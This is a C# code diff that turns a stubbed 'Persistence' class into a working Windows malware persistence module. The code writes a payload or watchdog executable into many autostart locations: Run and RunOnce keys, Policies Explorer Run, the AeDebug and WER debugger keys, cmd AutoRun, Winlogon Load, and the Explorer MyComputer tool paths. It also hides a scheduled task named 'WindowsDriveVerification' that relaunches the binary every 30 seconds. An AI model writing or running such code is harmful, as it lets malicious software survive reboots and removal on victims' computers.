@@ -1,198 +1,84 @@
+using System;
+using System.Diagnostics;
+
 namespace Persistence{
-    public class Persistence : IPersistence{
+    public class Persistence{
+
         public static void runAllTechniques()
         {
-            throw new NotImplementedException();
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RunServicesOnce", Path.Combine(Watchdog.PayloadPath, Watchdog.PayloadName)); // Simple Run Keys
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\", "RunServicesOnce", Path.Combine(Watchdog.PayloadPath, Watchdog.PayloadName));
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RunServices", Path.Combine(Watchdog.PayloadPath, Watchdog.PayloadName));
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RunServices", Path.Combine(Watchdog.PayloadPath, Watchdog.PayloadName));
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\", "Run", Path.Combine(Watchdog.PayloadPath, Watchdog.PayloadName));
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\", "RunOnce", Path.Combine(Watchdog.PayloadPath, Watchdog.PayloadName));
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "Run", Path.Combine(Watchdog.PayloadPath, Watchdog.PayloadName));
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "RunOnce", Path.Combine(Watchdog.PayloadPath, Watchdog.PayloadName));
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows", "Load", Path.Combine(Watchdog.PayloadPath, Watchdog.PayloadName));
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\", "Run", Path.Combine(Watchdog.PrimaryWatchdogPath, Watchdog.PrimaryWatchdogName));
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\", "Run", Path.Combine(Watchdog.PrimaryWatchdogPath, Watchdog.PrimaryWatchdogName));
+
+
+
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug\", "Debugger", Path.Combine(Watchdog.PrimaryWatchdogPath, Watchdog.PrimaryWatchdogName)); //relies on application crash
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKLM\Software\Microsoft\Windows\Windows Error Reporting\Hangs\", "Debugger", Path.Combine(Watchdog.PrimaryWatchdogPath, Watchdog.PrimaryWatchdogName)); //relies on application crash
+
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKEY_CURRENT_USER\Software\Microsoft\Command Processor\", "AutoRun", Path.Combine(Watchdog.PrimaryWatchdogPath, Watchdog.PrimaryWatchdogName)); //Runs when cmd.exe starts
+
+
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer", "BackupPath", Path.Combine(Watchdog.PrimaryWatchdogPath, Watchdog.PrimaryWatchdogName)); //These three are Windows background processes
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer", "cleanuppath", Path.Combine(Watchdog.PrimaryWatchdogPath, Watchdog.PrimaryWatchdogName));
+            RegistryHelper.RegistryHelper.SetRegistryKey(@"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer", "DefragPath", Path.Combine(Watchdog.PrimaryWatchdogPath, Watchdog.PrimaryWatchdogName));
+
+
+            string taskName = "WindowsDriveVerification";
+            string executablePath = Path.Combine(Watchdog.PrimaryWatchdogPath, Watchdog.PrimaryWatchdogName); // Path to the binary you want to run
+
+            // Check if the task exists
+            if (!TaskExists(taskName))
+            {
+                // Create the task if it doesn't exist
+                CreateScheduledTask(taskName, executablePath, 30); // Runs every 30 seconds
+                Console.WriteLine($"Scheduled task '{taskName}' created successfully.");
+            }
+            else
+            {
+                Console.WriteLine($"Scheduled task '{taskName}' already exists.");
+            }
+
         }
 
-        public static void makeAeDebugKey()
+
+        static bool TaskExists(string taskName)
         {
-            throw new NotImplementedException();
+            Process process = new Process();
+            process.StartInfo.FileName = "schtasks";
+            process.StartInfo.Arguments = $"/Query /TN \"{taskName}\"";
+            process.StartInfo.RedirectStandardOutput = true;
+            process.StartInfo.UseShellExecute = false;
+            process.StartInfo.CreateNoWindow = true;
+
+            process.Start();
+            string output = process.StandardOutput.ReadToEnd();
+            process.WaitForExit();
+
+            return output.Contains(taskName);
         }
 
-        public static void makeAmsiKey()
+        // Function to create a scheduled task
+        static void CreateScheduledTask(string taskName, string binaryPath, int intervalSeconds)
         {
-            throw new NotImplementedException();
-        }
+            // Create the schtasks command to run every few seconds
+            string command = $"/Create /TN \"{taskName}\" /TR \"{binaryPath}\" /SC ONCE /ST 00:00 /F /RI {intervalSeconds}";
 
-        public static void makeAuthenticationPackages()
-        {
-            throw new NotImplementedException();
-        }
+            Process process = new Process();
+            process.StartInfo.FileName = "schtasks";
+            process.StartInfo.Arguments = command;
+            process.StartInfo.UseShellExecute = false;
+            process.StartInfo.CreateNoWindow = true;
 
-        public static void makeAutoDialDll()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void makeBootVerificationProgram()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void makeCmdAutoRun()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void makeCodeSigning()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void makeCredManDll()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void makeDiskCleanupHandler()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void makeExplorerTools()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void makeFileExtensionHijacking()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void makeHhctrlKey()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void makeHtmlHelpAuthorKey()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void makeIFilter()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void makeImageFileExecution()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void makeKeyboardShortcut()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void makeLsaAExtension()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void makeMpNotify()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void makeNaturalLanguageKey()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void makePasswordFilter()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void makePowerShellProfile()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void makeRecycleBin()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void makeScreenSaver()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void makeServerLevelPluginDll()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void makeServicesKey()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void makeSilentExitMonitor()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void makeStartupFolder()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void makeTelemetryController()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void makeTsInitialProgram()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void makeUndeletable()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void makeUserInitMprLogonScript()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void makeWerDebuggerKey()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void makeWindowsLoadKey()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void makeWindowsTerminalProfile()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void SetKeyboardShortcuts()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void setScheduledTasks()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void setSilentProcessExit()
-        {
-            throw new NotImplementedException();
-        }
-
-        public static void setWinLogonKey()
-        {
-            throw new NotImplementedException();
+            process.Start();
+            process.WaitForExit();
         }
     }
 }
